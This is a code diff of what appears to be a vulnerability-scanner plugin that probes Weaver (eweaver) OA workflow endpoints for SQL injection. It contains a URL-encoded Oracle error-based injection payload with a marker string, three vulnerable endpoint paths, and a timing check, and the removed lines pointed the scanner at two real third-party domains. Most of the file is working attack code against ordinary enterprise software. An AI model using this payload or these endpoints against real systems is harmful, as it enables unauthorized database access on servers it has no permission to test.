@@ -25,12 +25,13 @@ def audit(arg):
         t3 = time.time()
         if code1==200 and code2 == 200 and (2*t2 - t1 - t3 > 3):
             security_hole(url + "   :sql Injection")
-        
+            return arg
+
     payloads = [
         'mobile/plugin/loadWfGraph.jsp?workflowid=1&requestid=1',
         'ServiceAction/com.eweaver.workflow.subprocess.servlet.SubprocessAction?action=getlist&nodeid=1',
         'ServiceAction/com.eweaver.workflow.workflow.servlet.WorkflowinfoAction?action=getreqxml&workflowid=1&id=2'
-        
+
         ]
     getdata = '%27%20AND%209830%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2899%29%7C%7CCHR%28113%29%7C%7CCHR%28116%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283708%3D3708%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28109%29%7C%7CCHR%28122%29%7C%7CCHR%28111%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%271%27%3D%271'
     for payload in payloads:
@@ -38,9 +39,9 @@ def audit(arg):
         code, head, res, errcode, _ = curl.curl2(url)
         if code == 200 and 'qcqtq1qmzoq' in res :
             security_hole(arg + payload + "   :sql Injection")
-        
-    
-if __name__ == '__main__':
+
+
+
+            return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('weaver_oa','http://oa.ad-mart.cn/')[1])
-    audit(assign('weaver_oa','http://mail.weifu.com.cn/')[1])
